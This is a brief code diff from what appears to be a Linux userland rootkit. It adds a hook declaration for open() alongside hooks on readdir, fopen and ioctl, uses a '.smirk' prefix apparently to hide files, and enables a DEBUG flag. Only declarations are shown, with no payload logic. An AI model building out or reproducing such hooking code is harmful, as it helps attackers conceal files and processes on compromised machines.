@@ -7,7 +7,7 @@
 #include <stdlib.h>
 #include <errno.h>
 #include <regex.h>
-// #define DEBUG
+#define DEBUG
 
 #define LIBC "libc.so.6"
 #define MAGIC_PREFIX ".smirk"
@@ -21,3 +21,4 @@ struct dirent *(*hooked_readdir)(DIR *);
 FILE *(*hooked_fopen)(const char *, const char *);
 FILE *(*hooked_fopen64)(const char *, const char *);
 int (*hooked_ioctl)(int , unsigned long , unsigned long *);
+int (*hooked_open)(const char *, int , unsigned long *);
